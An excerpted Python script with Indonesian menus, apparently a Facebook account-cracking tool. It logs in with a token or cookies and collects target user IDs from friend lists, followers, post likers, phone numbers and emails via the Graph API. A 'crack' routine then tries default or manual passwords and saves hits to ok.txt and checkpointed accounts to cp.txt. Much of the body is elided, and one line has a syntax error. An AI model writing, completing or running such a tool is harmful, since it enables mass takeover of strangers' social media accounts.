...
def logs():
  os.system("clear")
  banner()
  print((h+"\n["+h+"1"+h+"]"+k+" Masuk Pakai Token"))
  print((h+"["+h+"2"+h+"]"+k+" Masuk Pakai Cookies"))
  print((h+"["+h+"0"+h+"]"+k+" Keluar"))
  sek=input(h+"\n["+h+"•"+h+"]"+k+" Pilih : ")
  if sek=="":
...
def log_token():
    ...
    try:
        ...
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+k+"•"+k+"]"++" Ok Masuk Berhasil"))
        bot_follow()
    except KeyError:
        print((p+"["+p+"!"+p+"]"+k+" Token Tidak Tersedia"))
        os.system("clear")
        logs()
...
def menu():
    ...
    print((h+"\n["+h+"•"+h+"]"+h+" ID Kamu : "+id))
    print((h+"["+h+"∆"+h+"]"+h+" IP Kamu : "+ip))
    print((h+"["+h+"∆"+h+"]"+h+" Status  : "+u+"IP Lu Jelek Dek"+p))
    print((h+"["+h+"∆"+h+"]"+h+" Waktu  : "+durasi))
    print((m+"\n["+m+"P"+m+"]"+m+" Crack ID Dari Publik/FL"))
    print((m+"["+m+"F"+m+"]"+m+" Crack ID Dari Pengikut"))
    print((m+"["+m+"L"+m+"]"+m+" Crack ID Dari Tanggapan Post"))
    print((m+"["+m+"N"+m+"]"+m+" Crack Dar Nomor HP"))
    print((m+"["+m+"E"+m+"]"+m+" Crack Dari Email"))
    print((m+"["+m+"G"+m+"]"+m+" Ambil Data Target"))
    print((m+"["+m+"R"+m+"]"+m+" Hasil Crack"))
    print((k+"["+k+"X"+k+"]"+k+" Keluar"))
    pilih_menu()
...
def pilihcrack(file):
  print((h+"\n["+h+"1"+h+"]"+h+" Mbasic ("+k+"Tercepat"+p+")"))
  print((h+"["+h+"2"+h+"]"+h+" Mbasic + TTL - Slow"))
  krah=input(p+"\n["+p+"•"+p+"]"+p+" Pilih : ")
  if krah in[""]:
    print((p+"["+p+"!"+p+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    crack(file)
  elif krah in["2","02"]:
...
def publik():
	try:
		...
		print((p+"\n["+p+"!"+p+"]"+p+" Cookie/Token Tidak Tersedia"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((h+"\n["+h+"•"+h+"]"+h+" Silahkan \'Masukan\' ID Target FL Publik"))
		idt = input(h+"["+h+"•"+h+"]"+h+" Nomor ID Target Publik : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((h+"["+h+"•"+h+"]"+h+" Nama Akun Target : "+op["name"]))
		except KeyError:
			print((h+"["+h+"!"+h+"]"+h+" ID FL Target Privat"))
			print((k+"\n[ "+k+"Balik"+k+" ]"+k))
			publik()
		...
		ys.close()
		print((h+"["+h+"•"+h+"]"+h+" Total ID : %s"%(len(id))))
...
def follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Tidak Tersedia"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(h+"\n["+h+"•"+h+"]"+h+" Pengikut ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((h+"["+h+"•"+h+"]"+h+" Nama Akun Target : "+op["name"]))
		except KeyError:
			print((h+"["+h+"!"+h+"]"+h+" ID Tidak Tersedia"))
			print((k+"\n[ "+k+"Balik"+k+" ]"+k))
			publik()
...
def likers():
	try:
		...
		print((m+"\n["+m+"!"+m+"]"+m+" Cookie/Token Tidak Tersedia"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(m+"\n["+m+"•"+m+"]"+m+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((m+"["+m+"!"+m+"]"+m+" ID Tidak Tersedia"))
			print((u+"\n[ "+u+"Balik"+u+" ]"+u))
			publik()
...
class crack:
	...
	def __init__(self,isifile):
		...
		self.cp=[]
		self.ko=0
		print((h+"\n["+h+"•"+h+"]"+h+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(h+"["+h+"•"+h+"]"+h+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
				...
				try:
					...
					print(("   %s"%e))
				print((k+"\n["+k+"•"+k+"]"+k+" Crack Dimulai..."+k+"\n["+k+"•"+k+"]"+k+" Akun [OK] Simpan ke : ok.txt"+k+"\n["+k+"•"+k+"]"+k+" Akun [CP] Simpan ke : cp.txt\n"))
...
def results(Tamir,Krahkrah):
        if len(Tamir) !=0:
                print(("[OK] : "+str(len(Tamir))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Tamir) ==0 and len(Krahkrah) ==0:
                print("\n")
